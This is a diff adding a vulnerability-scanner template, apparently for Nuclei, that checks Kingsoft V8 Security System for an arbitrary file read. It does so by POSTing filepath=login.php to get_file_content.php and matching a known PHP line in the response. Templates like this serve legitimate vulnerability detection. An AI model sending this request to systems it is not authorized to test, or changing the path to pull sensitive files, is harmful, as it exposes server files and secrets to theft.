@@ -1,0 +1,26 @@
+id: kingsoft-v8-arbitrary-file-read
+info:
+  name: Kingsoft V8 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in Kingsoft V8 Security System allows arbitrary file read.
+http:
+  - raw:
+      - |
+        POST /receive_file/get_file_content.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
+        Content-Type: application/x-www-form-urlencoded
+
+        filepath=login.php
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "require_once(\"language/zh_CN/login_resource.php\")"
